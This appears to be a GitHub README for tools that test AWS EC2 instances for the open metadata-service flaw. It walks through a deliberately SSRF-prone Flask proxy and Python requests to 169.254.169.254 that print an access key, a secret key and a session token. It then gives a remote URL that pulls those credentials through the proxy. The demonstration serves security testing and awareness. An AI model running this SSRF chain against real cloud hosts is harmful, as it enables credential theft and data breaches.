# cloud-instance-metadata-test-tools
Python Scripts to test cloud instances for the open metadata service vulnerability.
simple python proxy server (proxy-server.py) and retrieving parameters like hostname, IP address, and MAC address (get-info.py) scripts through an EC2 instance.

***Note: that the prerequisites are to install python-pip, git, and additionally the requests and flask python modules via PIP install.***

## INSTALLATION STEPS FOR a Linux-AMI Instance within EC2:
[ec2-user@ip-172.31.x.x ~]$ sudo yum install git -y
[ec2-user@ip-172.31.x.x ~]$ sudo yum install python-pip -y

[ec2-user@ip-172.31.x.x ~]$ sudo pip install flask

You may have to install requests, but looks like it is already installed on current Linux-AMI instances as of 5/1/2020

[ec2-user@ip-172.31.x.x ~]$ sudo pip install requests

Requirement already satisfied: requests in /usr/lib/python2.7/dist-packages

## Clone the repository from Github for the SSRF proxy server and get-info on the 

[ec2-user@ip-172.31.x.x ~]$ git clone https://github.com/gahlberg/cloud-instance-metadata-test-tools.git

Cloning into 'cloud-instance-metadata-test-tools'...

remote: Enumerating objects: 20, done.
remote: Counting objects: 100% (20/20), done.
remote: Compressing objects: 100% (19/19), done.
remote: Total 20 (delta 7), reused 0 (delta 0), pack-reused 0
Unpacking objects: 100% (20/20), done.
[ec2-user@ip-172.31.x.x ~]$ ls 

cloud-instance-metadata-test-tools

[ec2-user@ip-172.31.x.x ~]$ cd cloud-instance-metadata-test-tools/
[ec2-user@ip-172.31.x.x cloud-instance-metadata-test-tools]$ 
[ec2-user@ip-172.31.x.x cloud-instance-metadata-test-tools]$ chmod 777 get-info.py 
[ec2-user@ip-172.31.x.x cloud-instance-metadata-test-tools]$ chmod 777 proxy-server.py 
## Run Get-Info
[ec2-user@ip-172.31.x.x cloud-instance-metadata-test-tools]$ ./get-info.py 
Hostname: ip-172.31.x.x.ec2.internal
Private-ipv4-Address: 172.31.x.x
MAC-Address: 12:78:85:2e:e2:9b
## Run SSRF proxy server:
[ec2-user@ip-172.31.x.x cloud-instance-metadata-test-tools]$ ./proxy-server.py 
 * Serving Flask app "proxy-server" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: on
 * Running on http://0.0.0.0:8080/ (Press CTRL+C to quit)
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 296-577-211
 
## Ok now we have the SSRF running on the AWS Instance
	Now let's start navigating the vulnerability with our python interpreter on that AWS Instance:

[ec2-user@ip-172.31.x.x cloud-instance-metadata-test-tools]$ python
Python 2.7.16 (default, Feb 10 2020, 18:54:57) 
[GCC 4.8.5 20150623 (Red Hat 4.8.5-28)] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import requests
>>> print requests.get("http://169.254.169.254/").text
1.0
2007-01-19
2007-03-01
2007-08-29
2007-10-10
2007-12-15
2008-02-01
2008-09-01
2009-04-04
2011-01-01
2011-05-01
2012-01-12
2014-02-25
2014-11-05
2015-10-20
2016-04-19
2016-06-30
2016-09-02
2018-03-28
2018-08-17
2018-09-24
2019-10-01
latest
>>> print requests.get("http://169.254.169.254/latest").text
dynamic
meta-data
user-data
>>> print requests.get("http://169.254.169.254/latest/meta-data").text
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hostname
identity-credentials/
instance-action
instance-id
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
>>> print requests.get("http://169.254.169.254/latest/meta-data/security-groups").text
launch-wizard-1
>>> print requests.get("http://169.254.169.254/latest/meta-data/").text               
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hostname
identity-credentials/
instance-action
instance-id
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
>>> print requests.get("http://169.254.169.254/latest/meta-data/identity-credentials").text
ec2/
>>> print requests.get("http://169.254.169.254/latest/meta-data/identity-credentials/ec2").text
info
security-credentials/
>>> print requests.get("http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials").text
ec2-instance
>>> print requests.get("http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance").text
{
  "Code" : "Success",
  "LastUpdated" : "2020-05-07T22:09:26Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA5ZL6OWN43E322SVZ",
  "SecretAccessKey" : "bvh4SjWKLx9C0vXvgbo0bmxAu86+p7MJpyb8kP7A",
  "Token" : "IQoJb3JpZ2luX2VjEI///////////wEaCXVzLWVhc3QtMSJHMEUCIQCRiuYS8eyOfp8JuflJAFCKmBUqVa7cHRNDpJE9THqCZgIgXoY1xStydT3cvZ2tiYTPRZ0qS3gVPjnYYpfl/NoLY6EqyAMIx///////////ARAAGgw5NDc4NDIzNjQyODEiDG2Nwf/d+DcGABtZICqcAwuvGVOdhe9H8KCRh/wcDj436oft81PEcloEvyPFPKIYc+k4zeECnbm+ODX7CFrMYpx9KBQmgScQqnfWFIAujsCDtStpsfPDpnYNngd53uWk+HzC3jVMj1tBf2pqYqgnHP7Flceu+PQHQ5OVBIECj8BOXq92r1s/bKK8IDH/X1udm0DPrTB5C8HZJnc2wTzbSB2s9VPzZHXaRvqezX2Z08s2hVqHitzpcL55uldDzevzfh0gcVs1e/GHgnpjyFixPstrLH3sZ9QDEg9oK7B90pbvQ1TsZBiUV25usRBq2lPylgyposo1+cCgwI9KtT+Kyftj0KvYCXS547nInlBUmfv7J67dxeTzqpbinv8hjc0VF4RYyKRmgOYQr/JMi6gjkULJJ/p2almI7L1F3UOB9HD4rXnCevrbRkZI3azpLeR45dhybDG/KKl9d+f1EVV05ND0j7Up03u8HxFiLWngyaDgrhJ/wnHCbMimXVv025DK6MFsL7C3vEsJh2+li00wJIslMGGjW6wVoCPgxvjEaOdUeWpRz3IVu6eU0yQwoY7S9QU65wEc7564BMrDU/Qm+4ZVmcCYeQmhAb4GBQRQKWRaD3itCsYFnf+4CAi9f0zzWp3i4rJBuh8aByGEcQW+aL24QzWD+5Kc+1XsJWZprqf5a695Wjt5RaCc1unmQHCfyYXVTIurqXwwNqRbBBc+4VnOdmYTuiNh+T1U68vzP/jufAWhAQ2NDgXV5kCpl/MAKFGTGJ8PMRsaebRIgIEhefQiQ9qlNa/sYWqsD3Z04NJL+LxG08QVPGkhRtF7xL8qmXavHivl2hwf1xmjPEymFIeEm7cbFBhZVAFD02F57v63EHW1j1aVp++gob4=",
  "Expiration" : "2020-05-08T04:44:10Z"
}
>>> 

## And look at that, a secret access token - can we do this through the SSRF?

## Next just to verify the proxy server can direct to a URL:
http://ec2-54-86-5-206.compute-1.amazonaws.com:8080/?url=http://www.google.com

## OK the proxy service is verified as working...

## In a browser let's take what we were able to find with AWS Instance meta-data from the python interpreter and put in a browser:
http://ec2-54-86-5-206.compute-1.amazonaws.com:8080/?url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance

	Same goes here!  So as a remote user with a SSRF I can pass in an internal url which is the AWS meta-data service and I can grab access tokens out of it.  If this access token had access to the S3 bucket with millions of accounts containing private information, I know have that information.  This is how Erratic was able to post all this information up on GitHub from the info that was taken from the S3 bucket from AWS Instances from this open vulnerability at the end of march in 2019, and roughly how she was able to do this, the question is how do you stop this? 

## From AWS, there is not a concrete answer, just a warning that you may need to put appropriate controls in place:
![screenshot](docs/screenshots/AWS Instance meta-data warning.png "AWS")
docs/screenshots/AWS Instance meta-data warning.png
https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
